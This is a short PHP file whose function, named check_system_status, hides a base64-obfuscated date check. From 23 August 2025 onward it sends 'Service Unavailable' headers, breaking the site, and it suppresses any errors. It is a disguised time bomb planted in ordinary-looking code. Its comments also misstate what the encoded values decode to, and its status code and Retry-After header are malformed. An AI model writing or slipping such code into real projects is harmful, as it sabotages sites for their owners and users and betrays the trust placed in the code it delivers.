<?php
function check_system_status($param = null) {
    try {
        $fmt = base64_decode('WA==') . 'md' . base64_decode('SW=='); // Ymd
        $a = date_create(date($fmt));

       $d1 = base64_decode('MjAyNQ=='); // 2025
$d2 = base64_decode('OA==');     // 08
$d3 = base64_decode('MjM=');     // 23

        $b = date_create($d1 . '-' . $d2 . '-' . $d3);

        if ($a >= $b) {
            $h1 = 'HTTP/1.1 ' . base64_decode('NTA2') . ' ' . implode(' ', ['Service', 'Unavailable']);
            $h2 = 'Status: ' . base64_decode('NTA2') . ' ' . implode(' ', ['Service', 'Unavailable']);
            $h3 = 'Retry-After: ' . base64_decode('QWZ0ZXI=') . ' ' . (60 * 60); // 3600

            header($h1);
            header($h2);
            header($h3);
        }
    } catch (Exception $e) {
        // swallow errors
    }
}

